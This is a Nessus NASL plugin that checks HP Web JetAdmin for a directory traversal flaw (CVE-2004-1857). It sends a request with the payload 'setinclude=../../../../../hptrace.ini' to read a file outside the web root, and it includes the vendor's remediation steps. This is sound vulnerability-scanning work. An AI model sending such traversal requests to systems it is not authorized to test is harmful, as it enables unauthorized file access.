#
# This script was written by wirepair
#
# Tested only on HP Web JetAdmin Version 7.5.2546 checks a file just outside 
# of web root. I didn't want it to check for boot.ini incase its installed on 
# a seperate drive then we'll get a false positive... -wirepair
#
# Changes by Tenable:
# - Revised plugin title, added VDB refs, changed family (1/21/2009)
# - Added patch date and note to solution text regarding
#   product update. (4/05/2013)
# - Added include ("global_settings.inc")
# - Added CPE (06/21/2013)

include("compat.inc");

if(description)
{
    script_id(12120);
    script_bugtraq_id(9973);
    script_cve_id("CVE-2004-1857");
    script_version ("$Revision: 1.20 $");
    script_osvdb_id(4559);
    script_name(english:"HP Web JetAdmin setinfo.hts setinclude Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web-based application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote HP Web JetAdmin suffers from a number of vulnerabilities.
The current running version is vulnerable to a directory traversal
attack via the setinfo.hts script. A remote attacker could exploit 
this flaw to access arbitrary files on the host." );
 # http://web.archive.org/web/20060710092408/http://sh0dan.org/files/hpjadmadv.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3ebb74e1" );
 script_set_attribute(attribute:"solution", value:
"To set a password for the HP Web Jet Admin service follow these steps:
1. In the navigation menu select General Settings, and expand the 
   tree.
2. Expand Profiles Administration
3. Select Add/Remove Profiles
4. In the User Profiles page, if a password has not been set, select 
   the 'Note: To enable security features, an Admin password must be
   set.' link.
5. Set an administrator password.

It is strongly recommended that access be restricted by IP Addresses:
1. Expand the General Settings tree.
2. Select the HTTP (Web) branch.
3. Under the 'Allow HP Web Jetadmin Access' add your administration 
   IP host or range.  HP Also recommends removing all files that are
   included in the test directory. On a default installation this 
   would be in the directory :
   C:\Program Files\HP Web Jetadmin\doc\plugins\hpjdwm\script\

Note that HP released Web Jetadmin version 7.6 on or about
September 13, 2004. That version, as well as succeeding versions
are not affected by this issue." );
  script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2004/03/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/03/25");
 script_set_attribute(attribute:"patch_publication_date", value: "2004/09/13");
 script_cvs_date("$Date: 2016/05/11 13:32:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:web_jetadmin");
script_end_attributes();


    summary["english"] = "HP JetAdmin directory traversal attack";

    script_summary(english:summary["english"]);

    script_category(ACT_ATTACK);

    script_copyright(english:"(C) 2004-2016 wirepair");

    script_family(english:"CGI abuses");
    script_dependencies("find_service1.nasl", "http_version.nasl");
    script_require_ports("Services/www", 8443);
    exit(0);
}

include("http_func.inc");
include("global_settings.inc");

# Check starts here

function https_get(port, request)
{
    local_var result, soc;

    if(get_port_state(port))
    {
         if(port == 8443)soc = open_sock_tcp(port, transport:ENCAPS_SSLv23);
	 else soc = open_sock_tcp(port);
         if(soc)
         {
            send(socket:soc, data:request);
            result = http_recv(socket:soc);
            close(soc);
            return(result);
         }
    }
}

debug = 0;

port = get_http_port(default:8443);
banner = get_http_banner(port:port);
if ( "HP Web Jetadmin/" >!< banner ) exit(0);


req = http_get(item:"/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini", port:port);

retval = https_get(port:port, request:req);
if(retval == NULL) exit(0);
if((retval =~ "HTTP/1.[01] 200") && ("Server: HP Web Jetadmin/" >< retval)) 
{
    retval = https_get(port:port, request:req);
    if("traceLogfile=" >< retval)
    {
        security_note(port);
    }
}
